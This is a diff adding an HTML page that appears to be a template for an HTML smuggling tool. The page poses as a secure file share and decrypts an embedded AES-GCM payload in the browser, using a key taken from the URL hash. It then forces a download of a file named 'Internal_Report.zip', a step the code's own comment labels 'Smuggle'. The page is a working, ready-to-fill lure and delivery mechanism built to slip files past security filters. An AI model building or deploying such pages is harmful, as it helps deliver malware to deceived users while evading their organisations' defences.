@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure File Share</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; max-width: 400px; }
+        .icon { font-size: 50px; margin-bottom: 20px; }
+        .btn { background: #0078d4; color: white; padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; text-decoration: none; }
+        .btn:hover { background: #005a9e; }
+        #status { margin-top: 20px; color: #666; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">📁</div>
+        <h2>Protected Document</h2>
+        <p>This file is encrypted. Access is restricted to authorized sessions only.</p>
+        <button id="downloadBtn" class="btn">Unlock & Download</button>
+        <div id="status">Waiting for session key...</div>
+    </div>
+
+    <script>
+        // Placeholders for the Generator
+        const payload = {
+            data: "{{PAYLOAD}}",
+            iv: "{{IV}}",
+            tag: "{{TAG}}"
+        };
+
+        async function decryptAndDownload() {
+            const status = document.getElementById('status');
+            
+            // 1. Get Key from URL Hash (#)
+            const keyHex = window.location.hash.substring(1);
+            if (!keyHex || keyHex.length !== 64) {
+                status.innerText = "Error: Invalid or missing session key in URL.";
+                status.style.color = "red";
+                return;
+            }
+
+            try {
+                status.innerText = "Decrypting in memory...";
+                
+                // 2. Import the Key
+                const keyBuffer = new Uint8Array(keyHex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+                const cryptoKey = await crypto.subtle.importKey("raw", keyBuffer, "AES-GCM", true, ["decrypt"]);
+
+                // 3. Prepare Data
+                const encryptedData = Uint8Array.from(atob(payload.data), c => c.charCodeAt(0));
+                const iv = Uint8Array.from(atob(payload.iv), c => c.charCodeAt(0));
+                const tag = Uint8Array.from(atob(payload.tag), c => c.charCodeAt(0));
+
+                const combined = new Uint8Array(encryptedData.length + tag.length);
+                combined.set(encryptedData);
+                combined.set(tag, encryptedData.length);
+
+                // 4. Decrypt
+                const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv: iv }, cryptoKey, combined);
+                
+                // 5. Smuggle (Trigger Download)
+                const url = URL.createObjectURL(new Blob([decrypted]));
+                const a = document.createElement("a");
+                a.href = url;
+                a.download = "Internal_Report.zip"; 
+                a.click();
+
+                status.innerText = "Decryption successful. File downloaded.";
+                status.style.color = "green";
+            } catch (e) {
+                console.error(e);
+                status.innerText = "Decryption failed. The key might be incorrect.";
+                status.style.color = "red";
+            }
+        }
+
+        document.getElementById('downloadBtn').addEventListener('click', decryptAndDownload);
+    </script>
+</body>
+</html>
